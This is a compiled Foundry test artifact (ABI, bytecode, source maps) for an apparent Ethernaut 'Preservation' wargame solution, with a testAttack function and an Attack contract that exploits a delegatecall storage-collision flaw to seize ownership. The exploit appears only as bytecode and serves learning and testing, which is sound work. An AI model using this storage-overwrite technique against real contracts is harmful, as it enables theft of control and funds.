{
  "abi": [
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "name": "log",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "log_address",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256[]",
          "name": "val",
          "type": "uint256[]"
        }
      ],
      "name": "log_array",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "int256[]",
          "name": "val",
          "type": "int256[]"
        }
      ],
      "name": "log_array",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address[]",
          "name": "val",
          "type": "address[]"
        }
      ],
      "name": "log_array",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "name": "log_bytes",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "bytes32",
          "name": "",
          "type": "bytes32"
        }
      ],
      "name": "log_bytes32",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "int256",
          "name": "",
          "type": "int256"
        }
      ],
      "name": "log_int",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "key",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "address",
          "name": "val",
          "type": "address"
        }
      ],
      "name": "log_named_address",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "key",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "uint256[]",
          "name": "val",
          "type": "uint256[]"
        }
      ],
      "name": "log_named_array",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "key",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "int256[]",
          "name": "val",
          "type": "int256[]"
        }
      ],
      "name": "log_named_array",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "key",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "address[]",
          "name": "val",
          "type": "address[]"
        }
      ],
      "name": "log_named_array",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "key",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "bytes",
          "name": "val",
          "type": "bytes"
        }
      ],
      "name": "log_named_bytes",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "key",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "bytes32",
          "name": "val",
          "type": "bytes32"
        }
      ],
      "name": "log_named_bytes32",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "key",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "int256",
          "name": "val",
          "type": "int256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "decimals",
          "type": "uint256"
        }
      ],
      "name": "log_named_decimal_int",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "key",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "val",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "decimals",
          "type": "uint256"
        }
      ],
      "name": "log_named_decimal_uint",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "key",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "int256",
          "name": "val",
          "type": "int256"
        }
      ],
      "name": "log_named_int",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "key",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "string",
          "name": "val",
          "type": "string"
        }
      ],
      "name": "log_named_string",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "key",
          "type": "string"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "val",
          "type": "uint256"
        }
      ],
      "name": "log_named_uint",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "name": "log_string",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "log_uint",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "name": "logs",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "IS_SCRIPT",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "IS_TEST",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "alice",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [
        {
          "internalType": "contract Attack",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "failed",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "pr",
      "outputs": [
        {
          "internalType": "contract Preservation",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "setUp",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "testAttack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "timezone1",
      "outputs": [
        {
          "internalType": "contract LibraryContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "timezone2",
      "outputs": [
        {
          "internalType": "contract LibraryContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "vm",
      "outputs": [
        {
          "internalType": "contract Vm",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": {
    "object": "0x60806040526000805462ff00ff19166201000117905534801561002157600080fd5b50610e5a806100316000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80636f2db99c116100715780636f2db99c146101295780639e5faafc14610131578063ba414fa614610144578063f8ccbf471461015c578063fa7626d41461016f578063fb47e3a21461017c57600080fd5b80630a9254e4146100ae5780631432159f146100b85780631509c42a146100e85780633a768463146100fb5780634d159fb914610116575b600080fd5b6100b661018f565b005b6009546100cb906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b6008546100cb906001600160a01b031681565b6100cb737109709ecfa91a80626ff3989d68f67f5b1dd12d81565b600a546100cb906001600160a01b031681565b6100b661036d565b600b546100cb906001600160a01b031681565b61014c610501565b60405190151581526020016100df565b60005461014c9062010000900460ff1681565b60005461014c9060ff1681565b600c546100cb906001600160a01b031681565b60405161019b90610888565b604051809103906000f0801580156101b7573d6000803e3d6000fd5b50600980546001600160a01b0319166001600160a01b03929092169190911790556040516101e490610888565b604051809103906000f080158015610200573d6000803e3d6000fd5b50600a80546001600160a01b0319166001600160a01b03929092169190911790556040516001625e79b760e01b0319815260016004820152737109709ecfa91a80626ff3989d68f67f5b1dd12d9063ffa18649906024016020604051808303816000875af1158015610276573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061029a91906108ae565b600c80546001600160a01b0319166001600160a01b03928316179055600954600a546040519183169216906102ce90610894565b6001600160a01b03928316815291166020820152604001604051809103906000f080158015610301573d6000803e3d6000fd5b50600880546001600160a01b0319166001600160a01b039290921691909117905560405161032e906108a1565b604051809103906000f08015801561034a573d6000803e3d6000fd5b50600b80546001600160a01b0319166001600160a01b0392909216919091179055565b600854600b546040516316f6a3e960e21b81526001600160a01b039182166004820152911690635bda8fa490602401600060405180830381600087803b1580156103b657600080fd5b505af11580156103ca573d6000803e3d6000fd5b5050600b5460085460408051631ee3ca1160e11b8152905161044c95506001600160a01b0393841694509190921691633dc794229160048083019260209291908290030181865afa158015610423573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061044791906108ae565b61062c565b60085460405163078f013160e51b8152600160048201526001600160a01b039091169063f1e0262090602401600060405180830381600087803b15801561049257600080fd5b505af11580156104a6573d6000803e3d6000fd5b5050600c5460085460408051638da5cb5b60e01b815290516104ff95506001600160a01b0393841694509190921691638da5cb5b9160048083019260209291908290030181865afa158015610423573d6000803e3d6000fd5b565b60008054610100900460ff16156105215750600054610100900460ff1690565b6000737109709ecfa91a80626ff3989d68f67f5b1dd12d3b156106275760408051737109709ecfa91a80626ff3989d68f67f5b1dd12d602082018190526519985a5b195960d21b828401528251808303840181526060830190935260009290916105af917f667f9d70ca411d70ead50d8d5c22070dafc36ad75f3dcf5e7237b22ade9aecc491608001610919565b60408051601f19818403018152908290526105c99161093d565b6000604051808303816000865af19150503d8060008114610606576040519150601f19603f3d011682016040523d82523d6000602084013e61060b565b606091505b50915050808060200190518101906106239190610949565b9150505b919050565b806001600160a01b0316826001600160a01b031614610778577f41304facd9323d75b11bcdd609cb38effffdb05710f7caf0e9b16c6d9d709f506040516106b29060208082526025908201527f4572726f723a2061203d3d2062206e6f7420736174697366696564205b616464604082015264726573735d60d81b606082015260800190565b60405180910390a160408051818152600a81830152690808115e1c1958dd195960b21b60608201526001600160a01b038316602082015290517f9c4e8541ca8f0dc1c413f9108f66d82d3cecb1bddbce437a61caa3175c4cc96f9181900360800190a160408051818152600a8183015269080808081058dd1d585b60b21b60608201526001600160a01b038416602082015290517f9c4e8541ca8f0dc1c413f9108f66d82d3cecb1bddbce437a61caa3175c4cc96f9181900360800190a161077861077c565b5050565b737109709ecfa91a80626ff3989d68f67f5b1dd12d3b156108775760408051737109709ecfa91a80626ff3989d68f67f5b1dd12d602082018190526519985a5b195960d21b9282019290925260016060820152600091907f70ca10bbd0dbfd9020a9f4b13402c16cb120705e0d1c0aeab10fa353ae586fc49060800160408051601f19818403018152908290526108169291602001610919565b60408051601f19818403018152908290526108309161093d565b6000604051808303816000865af19150503d806000811461086d576040519150601f19603f3d011682016040523d82523d6000602084013e610872565b606091505b505050505b6000805461ff001916610100179055565b60ab8061096c83390190565b6102e980610a1783390190565b61012580610d0083390190565b6000602082840312156108c057600080fd5b81516001600160a01b03811681146108d757600080fd5b9392505050565b6000815160005b818110156108ff57602081850181015186830152016108e5565b8181111561090e576000828601525b509290920192915050565b6001600160e01b031983168152600061093560048301846108de565b949350505050565b60006108d782846108de565b60006020828403121561095b57600080fd5b815180151581146108d757600080fdfe6080604052348015600f57600080fd5b50608d8061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80633beb26c414602d575b600080fd5b603d6038366004603f565b600055565b005b600060208284031215605057600080fd5b503591905056fea26469706673582212207a4a49116408e410c8cf808d16ea4c00408de92887f518e4354b5e8f6573e7a364736f6c634300080f0033608060405234801561001057600080fd5b506040516102e93803806102e983398101604081905261002f9161008c565b600080546001600160a01b039384166001600160a01b03199182161790915560018054929093169181169190911790915560028054909116331790556100bf565b80516001600160a01b038116811461008757600080fd5b919050565b6000806040838503121561009f57600080fd5b6100a883610070565b91506100b660208401610070565b90509250929050565b61021b806100ce6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806327d6974f1461005c5780633dc794221461008b5780635bda8fa41461009e5780638da5cb5b146100b3578063f1e02620146100c6575b600080fd5b60015461006f906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b60005461006f906001600160a01b031681565b6100b16100ac366004610191565b6100d9565b005b60025461006f906001600160a01b031681565b6100b16100d4366004610191565b610163565b600154604051630efac9b160e21b6020820152602481018390526001600160a01b03909116906044015b60408051601f198184030181529082905261011d916101aa565b600060405180830381855af49150503d8060008114610158576040519150601f19603f3d011682016040523d82523d6000602084013e61015d565b606091505b50505050565b600054604051630efac9b160e21b6020820152602481018390526001600160a01b0390911690604401610103565b6000602082840312156101a357600080fd5b5035919050565b6000825160005b818110156101cb57602081860181015185830152016101b1565b818111156101da576000828501525b50919091019291505056fea26469706673582212206b19abe8e5336c0c976e589c806bdc9769a8f87353cf37fea0fd1d9e7023f02664736f6c634300080f0033608060405234801561001057600080fd5b50610105806100206000396000f3fe6080604052348015600f57600080fd5b5060043610603c5760003560e01c80633beb26c41460415780638da5cb5b146077578063d4ee1d901460a5575b600080fd5b6075604c36600460b7565b50600280546001600160a01b031916737e5f4552091a69125d5dfcb7b8c2659029395bdf179055565b005b6002546089906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6001546089906001600160a01b031681565b60006020828403121560c857600080fd5b503591905056fea2646970667358221220f4d52d44b7eeb8364fee8fa0edf2bd4e26cdbcc50630102fbeb2c317fd47e8ea64736f6c634300080f0033a2646970667358221220519a2669a8c2e9fe7bbac8a8d6780f30722760359e5f9fc4c260524b1d0778e164736f6c634300080f0033",
    "sourceMap": "593:1065:18:-:0;;;1572:26:0;;;-1:-1:-1;;170:28:1;;;;;593:1065:18;;;;;;;;;;;;;;;;",
    "linkReferences": {}
  },
  "deployedBytecode": {
    "object": "0x608060405234801561001057600080fd5b50600436106100a95760003560e01c80636f2db99c116100715780636f2db99c146101295780639e5faafc14610131578063ba414fa614610144578063f8ccbf471461015c578063fa7626d41461016f578063fb47e3a21461017c57600080fd5b80630a9254e4146100ae5780631432159f146100b85780631509c42a146100e85780633a768463146100fb5780634d159fb914610116575b600080fd5b6100b661018f565b005b6009546100cb906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b6008546100cb906001600160a01b031681565b6100cb737109709ecfa91a80626ff3989d68f67f5b1dd12d81565b600a546100cb906001600160a01b031681565b6100b661036d565b600b546100cb906001600160a01b031681565b61014c610501565b60405190151581526020016100df565b60005461014c9062010000900460ff1681565b60005461014c9060ff1681565b600c546100cb906001600160a01b031681565b60405161019b90610888565b604051809103906000f0801580156101b7573d6000803e3d6000fd5b50600980546001600160a01b0319166001600160a01b03929092169190911790556040516101e490610888565b604051809103906000f080158015610200573d6000803e3d6000fd5b50600a80546001600160a01b0319166001600160a01b03929092169190911790556040516001625e79b760e01b0319815260016004820152737109709ecfa91a80626ff3989d68f67f5b1dd12d9063ffa18649906024016020604051808303816000875af1158015610276573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061029a91906108ae565b600c80546001600160a01b0319166001600160a01b03928316179055600954600a546040519183169216906102ce90610894565b6001600160a01b03928316815291166020820152604001604051809103906000f080158015610301573d6000803e3d6000fd5b50600880546001600160a01b0319166001600160a01b039290921691909117905560405161032e906108a1565b604051809103906000f08015801561034a573d6000803e3d6000fd5b50600b80546001600160a01b0319166001600160a01b0392909216919091179055565b600854600b546040516316f6a3e960e21b81526001600160a01b039182166004820152911690635bda8fa490602401600060405180830381600087803b1580156103b657600080fd5b505af11580156103ca573d6000803e3d6000fd5b5050600b5460085460408051631ee3ca1160e11b8152905161044c95506001600160a01b0393841694509190921691633dc794229160048083019260209291908290030181865afa158015610423573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061044791906108ae565b61062c565b60085460405163078f013160e51b8152600160048201526001600160a01b039091169063f1e0262090602401600060405180830381600087803b15801561049257600080fd5b505af11580156104a6573d6000803e3d6000fd5b5050600c5460085460408051638da5cb5b60e01b815290516104ff95506001600160a01b0393841694509190921691638da5cb5b9160048083019260209291908290030181865afa158015610423573d6000803e3d6000fd5b565b60008054610100900460ff16156105215750600054610100900460ff1690565b6000737109709ecfa91a80626ff3989d68f67f5b1dd12d3b156106275760408051737109709ecfa91a80626ff3989d68f67f5b1dd12d602082018190526519985a5b195960d21b828401528251808303840181526060830190935260009290916105af917f667f9d70ca411d70ead50d8d5c22070dafc36ad75f3dcf5e7237b22ade9aecc491608001610919565b60408051601f19818403018152908290526105c99161093d565b6000604051808303816000865af19150503d8060008114610606576040519150601f19603f3d011682016040523d82523d6000602084013e61060b565b606091505b50915050808060200190518101906106239190610949565b9150505b919050565b806001600160a01b0316826001600160a01b031614610778577f41304facd9323d75b11bcdd609cb38effffdb05710f7caf0e9b16c6d9d709f506040516106b29060208082526025908201527f4572726f723a2061203d3d2062206e6f7420736174697366696564205b616464604082015264726573735d60d81b606082015260800190565b60405180910390a160408051818152600a81830152690808115e1c1958dd195960b21b60608201526001600160a01b038316602082015290517f9c4e8541ca8f0dc1c413f9108f66d82d3cecb1bddbce437a61caa3175c4cc96f9181900360800190a160408051818152600a8183015269080808081058dd1d585b60b21b60608201526001600160a01b038416602082015290517f9c4e8541ca8f0dc1c413f9108f66d82d3cecb1bddbce437a61caa3175c4cc96f9181900360800190a161077861077c565b5050565b737109709ecfa91a80626ff3989d68f67f5b1dd12d3b156108775760408051737109709ecfa91a80626ff3989d68f67f5b1dd12d602082018190526519985a5b195960d21b9282019290925260016060820152600091907f70ca10bbd0dbfd9020a9f4b13402c16cb120705e0d1c0aeab10fa353ae586fc49060800160408051601f19818403018152908290526108169291602001610919565b60408051601f19818403018152908290526108309161093d565b6000604051808303816000865af19150503d806000811461086d576040519150601f19603f3d011682016040523d82523d6000602084013e610872565b606091505b505050505b6000805461ff001916610100179055565b60ab8061096c83390190565b6102e980610a1783390190565b61012580610d0083390190565b6000602082840312156108c057600080fd5b81516001600160a01b03811681146108d757600080fd5b9392505050565b6000815160005b818110156108ff57602081850181015186830152016108e5565b8181111561090e576000828601525b509290920192915050565b6001600160e01b031983168152600061093560048301846108de565b949350505050565b60006108d782846108de565b60006020828403121561095b57600080fd5b815180151581146108d757600080fdfe6080604052348015600f57600080fd5b50608d8061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80633beb26c414602d575b600080fd5b603d6038366004603f565b600055565b005b600060208284031215605057600080fd5b503591905056fea26469706673582212207a4a49116408e410c8cf808d16ea4c00408de92887f518e4354b5e8f6573e7a364736f6c634300080f0033608060405234801561001057600080fd5b506040516102e93803806102e983398101604081905261002f9161008c565b600080546001600160a01b039384166001600160a01b03199182161790915560018054929093169181169190911790915560028054909116331790556100bf565b80516001600160a01b038116811461008757600080fd5b919050565b6000806040838503121561009f57600080fd5b6100a883610070565b91506100b660208401610070565b90509250929050565b61021b806100ce6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806327d6974f1461005c5780633dc794221461008b5780635bda8fa41461009e5780638da5cb5b146100b3578063f1e02620146100c6575b600080fd5b60015461006f906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b60005461006f906001600160a01b031681565b6100b16100ac366004610191565b6100d9565b005b60025461006f906001600160a01b031681565b6100b16100d4366004610191565b610163565b600154604051630efac9b160e21b6020820152602481018390526001600160a01b03909116906044015b60408051601f198184030181529082905261011d916101aa565b600060405180830381855af49150503d8060008114610158576040519150601f19603f3d011682016040523d82523d6000602084013e61015d565b606091505b50505050565b600054604051630efac9b160e21b6020820152602481018390526001600160a01b0390911690604401610103565b6000602082840312156101a357600080fd5b5035919050565b6000825160005b818110156101cb57602081860181015185830152016101b1565b818111156101da576000828501525b50919091019291505056fea26469706673582212206b19abe8e5336c0c976e589c806bdc9769a8f87353cf37fea0fd1d9e7023f02664736f6c634300080f0033608060405234801561001057600080fd5b50610105806100206000396000f3fe6080604052348015600f57600080fd5b5060043610603c5760003560e01c80633beb26c41460415780638da5cb5b146077578063d4ee1d901460a5575b600080fd5b6075604c36600460b7565b50600280546001600160a01b031916737e5f4552091a69125d5dfcb7b8c2659029395bdf179055565b005b6002546089906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6001546089906001600160a01b031681565b60006020828403121560c857600080fd5b503591905056fea2646970667358221220f4d52d44b7eeb8364fee8fa0edf2bd4e26cdbcc50630102fbeb2c317fd47e8ea64736f6c634300080f0033a2646970667358221220519a2669a8c2e9fe7bbac8a8d6780f30722760359e5f9fc4c260524b1d0778e164736f6c634300080f0033",
    "sourceMap": "593:1065:18:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;828:288;;;:::i;:::-;;699:32;;;;;-1:-1:-1;;;;;699:32:18;;;;;;-1:-1:-1;;;;;203:32:20;;;185:51;;173:2;158:18;699:32:18;;;;;;;;671:22;;;;;-1:-1:-1;;;;;671:22:18;;;321:38:1;;250:64;321:38;;737:32:18;;;;;-1:-1:-1;;;;;737:32:18;;;1122:534;;;:::i;775:20::-;;;;;-1:-1:-1;;;;;775:20:18;;;1819:584:0;;;:::i;:::-;;;1085:14:20;;1078:22;1060:41;;1048:2;1033:18;1819:584:0;920:187:20;170:28:1;;;;;;;;;;;;1572:26:0;;;;;;;;;801:20:18;;;;;-1:-1:-1;;;;;801:20:18;;;828:288;914:21;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;902:9:18;:33;;-1:-1:-1;;;;;;902:33:18;-1:-1:-1;;;;;902:33:18;;;;;;;;;;957:21;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;945:9:18;:33;;-1:-1:-1;;;;;;945:33:18;-1:-1:-1;;;;;945:33:18;;;;;;;;;;997:10;;-1:-1:-1;;;;;;997:10:18;;-1:-1:-1;997:10:18;;;1474:25:20;250:64:1;;997:7:18;;1447:18:20;;997:10:18;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;989:5;:18;;-1:-1:-1;;;;;;989:18:18;-1:-1:-1;;;;;989:18:18;;;;;;1047:9;;1067;;1022:56;;1047:9;;;;1067;;1022:56;;;:::i;:::-;-1:-1:-1;;;;;2035:15:20;;;2017:34;;2087:15;;2082:2;2067:18;;2060:43;1967:2;1952:18;1022:56:18;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;1017:2:18;:61;;-1:-1:-1;;;;;;1017:61:18;-1:-1:-1;;;;;1017:61:18;;;;;;;;;;1097:12;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;1088:6:18;:21;;-1:-1:-1;;;;;;1088:21:18;-1:-1:-1;;;;;1088:21:18;;;;;;;;;;828:288::o;1122:534::-;1346:2;;1379:6;;1346:42;;-1:-1:-1;;;1346:42:18;;-1:-1:-1;;;;;1379:6:18;;;1346:42;;;185:51:20;1346:2:18;;;:16;;158:18:20;;1346:42:18;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1416:6:18;;1425:2;;:21;;;-1:-1:-1;;;1425:21:18;;;;1399:48;;-1:-1:-1;;;;;;1416:6:18;;;;-1:-1:-1;1425:2:18;;;;;:19;;:21;;;;;;;;;;;;;;:2;:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1399:8;:48::i;:::-;1593:2;;:18;;-1:-1:-1;;;1593:18:18;;:2;:18;;;1474:25:20;-1:-1:-1;;;;;1593:2:18;;;;:15;;1447:18:20;;1593::18;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1631:5:18;;1638:2;;:10;;;-1:-1:-1;;;1638:10:18;;;;1622:27;;-1:-1:-1;;;;;;1631:5:18;;;;-1:-1:-1;1638:2:18;;;;;:8;;:10;;;;;;;;;;;;;;:2;:10;;;;;;;;;;;;;;1622:27;1122:534::o;1819:584:0:-;1853:4;1873:7;;;;;;;1869:528;;;-1:-1:-1;1903:7:0;;;;;;;;1819:584::o;1869:528::-;1941:17;2990:42;2978:55;3059:16;1980:374;;2196:43;;;1671:64;2196:43;;;2496:51:20;;;-1:-1:-1;;;2563:18:20;;;2556:34;2196:43:0;;;;;;;;;2469:18:20;;;2196:43:0;;;-1:-1:-1;;1671:64:0;;2086:175;;2135:34;;2086:175;;;:::i;:::-;;;;-1:-1:-1;;2086:175:0;;;;;;;;;;2047:232;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2020:259;;;2323:7;2312:27;;;;;;;;;;;;:::i;:::-;2297:42;;2002:352;1980:374;2374:12;1819:584;-1:-1:-1;1819:584:0:o;3615:277::-;3683:1;-1:-1:-1;;;;;3678:6:0;:1;-1:-1:-1;;;;;3678:6:0;;3674:212;;3705:44;;;;;3903:2:20;3885:21;;;3942:2;3922:18;;;3915:30;3981:34;3976:2;3961:18;;3954:62;-1:-1:-1;;;4047:2:20;4032:18;;4025:35;4092:3;4077:19;;3701:401;3705:44:0;;;;;;;;3768:34;;;4319:21:20;;;4376:2;4356:18;;;4349:30;-1:-1:-1;;;4410:2:20;4395:18;;4388:40;-1:-1:-1;;;;;4502:32:20;;4495:4;4480:20;;4473:62;3768:34:0;;;;;;;4460:3:20;3768:34:0;;;3821;;;4758:21:20;;;4815:2;4795:18;;;4788:30;-1:-1:-1;;;4849:2:20;4834:18;;4827:40;-1:-1:-1;;;;;4941:32:20;;4934:4;4919:20;;4912:62;3821:34:0;;;;;;;4899:3:20;3821:34:0;;;3869:6;:4;:6::i;:::-;3615:277;;:::o;2410:424::-;2990:42;2978:55;3059:16;2445:359;;2645:67;;;1671:64;2645:67;;;5187:51:20;;;-1:-1:-1;;;5254:18:20;;;5247:34;;;;2705:4:0;5297:18:20;;;5290:34;2482:11:0;;1671:64;2579:43;;5160:18:20;;2645:67:0;;;-1:-1:-1;;2645:67:0;;;;;;;;;;2534:196;;;2645:67;2534:196;;:::i;:::-;;;;-1:-1:-1;;2534:196:0;;;;;;;;;;2499:245;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;2445:359:0;2813:7;:14;;-1:-1:-1;;2813:14:0;;;;;2410:424::o;-1:-1:-1:-;;;;;;;;:::o;:::-;;;;;;;;:::o;:::-;;;;;;;;:::o;1510:290:20:-;1580:6;1633:2;1621:9;1612:7;1608:23;1604:32;1601:52;;;1649:1;1646;1639:12;1601:52;1675:16;;-1:-1:-1;;;;;1720:31:20;;1710:42;;1700:70;;1766:1;1763;1756:12;1700:70;1789:5;1510:290;-1:-1:-1;;;1510:290:20:o;2601:336::-;2642:3;2680:5;2674:12;2704:1;2714:128;2728:6;2725:1;2722:13;2714:128;;;2825:4;2810:13;;;2806:24;;2800:31;2787:11;;;2780:52;2743:12;2714:128;;;2860:6;2857:1;2854:13;2851:48;;;2895:1;2886:6;2881:3;2877:16;2870:27;2851:48;-1:-1:-1;2915:16:20;;;;;2601:336;-1:-1:-1;;2601:336:20:o;2942:278::-;-1:-1:-1;;;;;;3127:33:20;;3115:46;;3097:3;3177:37;3211:1;3202:11;;3194:6;3177:37;:::i;:::-;3170:44;2942:278;-1:-1:-1;;;;2942:278:20:o;3225:189::-;3354:3;3379:29;3404:3;3396:6;3379:29;:::i;3419:277::-;3486:6;3539:2;3527:9;3518:7;3514:23;3510:32;3507:52;;;3555:1;3552;3545:12;3507:52;3587:9;3581:16;3640:5;3633:13;3626:21;3619:5;3616:32;3606:60;;3662:1;3659;3652:12",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "IS_SCRIPT()": "f8ccbf47",
    "IS_TEST()": "fa7626d4",
    "alice()": "fb47e3a2",
    "attack()": "9e5faafc",
    "failed()": "ba414fa6",
    "pr()": "1509c42a",
    "setUp()": "0a9254e4",
    "testAttack()": "6f2db99c",
    "timezone1()": "1432159f",
    "timezone2()": "4d159fb9",
    "vm()": "3a768463"
  },
  "rawMetadata": "{\"compiler\":{\"version\":\"0.8.15+commit.e14f2714\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"name\":\"log\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"log_address\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256[]\",\"name\":\"val\",\"type\":\"uint256[]\"}],\"name\":\"log_array\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"int256[]\",\"name\":\"val\",\"type\":\"int256[]\"}],\"name\":\"log_array\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"val\",\"type\":\"address[]\"}],\"name\":\"log_array\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bytes\",\"name\":\"\",\"type\":\"bytes\"}],\"name\":\"log_bytes\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"byt